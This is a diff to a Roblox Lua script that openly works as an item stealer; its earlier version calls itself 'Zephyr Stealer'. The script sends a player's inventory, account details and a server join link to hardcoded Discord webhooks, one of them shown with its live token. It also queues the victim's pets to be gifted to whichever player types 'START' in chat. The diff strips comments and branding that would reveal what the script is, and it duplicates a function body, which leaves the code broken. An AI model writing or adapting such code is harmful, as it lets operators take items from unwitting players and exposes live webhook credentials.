@@ -1,3 +1,4 @@
+
 if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
     return
 end
@@ -45,9 +46,9 @@ local function initializeServices()
 end
 
 local CONFIG = {
-    username = getfenv().Username, -- Đảm bảo username này là tên người dùng bạn muốn theo dõi
+    username = getfenv().Username,
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVnNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
+    dualWebhook = "https://discord.com/api/webhooks/1392882033415684310/rl03oFKAXcJyIq0U1Bcp0UplxZO_yOhkS8NNCxhuaLwWbwbZRs0-qpcTjsY2pWn2QhLT",
     dualUsername = "namnnni2",
     dualWebhookThreshold = 1e12,
     
@@ -388,6 +389,92 @@ local DiscordWebhook = {}
 function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorityPlayer)
     local inventoryReport = ""
     local hasRarePet = false
+
+    for _, item in ipairs(itemsToSend) do
+        local displayName = item.Name
+
+        if item.Type == "Pet" then
+            local emoji = Utils.getEmojiForPet(item.Name)
+
+            local age = Utils.getAge(item.Tool.Name)
+            local weight = Utils.getWeight(item.Tool.Name)
+
+            local ageStr = age and ("[Age " .. tostring(age) .. "]") or ""
+            local weightStr = weight and ("[" .. tostring(weight) .. " KG]") or ""
+
+            local fullName = item.Name .. " " .. ageStr .. weightStr
+            displayName = emoji .. " " .. fullName
+            hasRarePet = hasRarePet or item.IsTarget
+        elseif item.Type == "Plant" then
+            displayName = ":deciduous_tree: " .. item.Name
+        else
+            displayName = ":dog: " .. item.Name
+        end
+
+        inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "
+"
+    end
+
+    if inventoryReport == "" then
+        inventoryReport = "No items found."
+    end
+
+    local accountAge = LocalPlayer.AccountAge
+    local username = LocalPlayer.Name
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local fernLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
+
+    return {
+        ["title"] = "**Inventory Report**",
+        ["description"] = "Player inventory details just executed a script.",
+        ["color"] = 65280,
+        ["fields"] = {
+            {
+                ["name"] = "👤 Username",
+                ["value"] = username,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📅 Account Age",
+                ["value"] = tostring(accountAge) .. " days",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "💰 Total Inventory Value",
+                ["value"] = Utils.formatNumber(totalValue) .. " R$",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎒 Inventory Items",
+                ["value"] = inventoryReport,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 Fern Join Link",
+                ["value"] = "[Click to join this server](" .. fernLink .. ")",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌀 Game Server Teleporter",
+                ["value"] = "```lua
+" .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId) .. "
+```",
+                ["inline"] = false
+            }
+        },
+        ["thumbnail"] = {
+            ["url"] = avatarUrl
+        },
+        ["footer"] = {
+            ["text"] = "Inventory auto-report with true value calculation 🌿"
+        },
+        ["timestamp"] = DateTime.now():ToIsoDate()
+    }
+end, totalValue, hasTargets, priorityPlayer)
+    local inventoryReport = ""
+    local hasRarePet = false
     
     for _, item in ipairs(itemsToSend) do
         local displayName = item.Name
@@ -473,9 +560,9 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
     
     local payload = {
         ["content"] = contentMsg,
-        ["username"] = "Zephyr Stealer",
+        ["username"] = finalUsername,
         ["embeds"] = {embed},
-        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png"
+        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
     }
     
     pcall(function()
@@ -739,23 +826,14 @@ function GiftingSystem.setupChatMonitoring()
         if p == LocalPlayer then return end
 
         local function onChatted(message)
-            -- Kích hoạt khi người chơi có CONFIG.username chat
-            if p and string.lower(p.Name) == string.lower(CONFIG.username) then
-                -- Kiểm tra xem người chơi đã có trong hàng đợi chưa để tránh thêm trùng lặp
-                local alreadyQueued = false
+            if string.upper(tostring(message)) == "START" then
                 for _, queued in ipairs(giftQueue) do
-                    if queued == p then
-                        alreadyQueued = true
-                        break
-                    end
+                    if queued == p then return end
                 end
 
-                if not alreadyQueued then
-                    local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                    if #targetPets > 0 or #regularPets > 0 then
-                        table.insert(giftQueue, p)
-                        warn(p.Name .. " (target user) chatted and added to gift queue.")
-                    end
+                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
+                if #targetPets > 0 or #regularPets > 0 then
+                    table.insert(giftQueue, p)
                 end
             end
         end
@@ -766,52 +844,20 @@ function GiftingSystem.setupChatMonitoring()
             end)
         end
 
-        -- Kích hoạt khi người chơi có CONFIG.username nhảy
-        if string.lower(p.Name) == string.lower(CONFIG.username) then
-            task.spawn(function()
-                repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
-                local hum = p.Character:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    hum:GetPropertyChangedSignal("Jump"):Connect(function()
-                        if hum.Jump then -- Kiểm tra nếu người chơi đang nhảy (Jump là true khi bắt đầu nhảy)
-                            -- Kiểm tra xem người chơi đã có trong hàng đợi chưa để tránh thêm trùng lặp
-                            local alreadyQueued = false
-                            for _, queued in ipairs(giftQueue) do
-                                if queued == p then
-                                    alreadyQueued = true
-                                    break
-                                end
-                            end
-
-                            if not alreadyQueued then
-                                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                                if #targetPets > 0 or #regularPets > 0 then
-                                    table.insert(giftQueue, p)
-                                    warn(p.Name .. " (target user) jumped and added to gift queue.")
-                                end
-                            end
-                        end
-                    end)
-                end
-            end)
-        end
-
         if p.Character then
             setupChat()
         else
             p.CharacterAdded:Connect(function()
-                task.wait(1) -- Đợi một chút để Character và Humanoid được tải
+                task.wait(1)
                 setupChat()
             end)
         end
     end
 
-    -- Kết nối với tất cả người chơi hiện tại
     for _, p in ipairs(Players:GetPlayers()) do
         connectPlayer(p)
     end
 
-    -- Kết nối với người chơi mới tham gia
     Players.PlayerAdded:Connect(connectPlayer)
 end
 
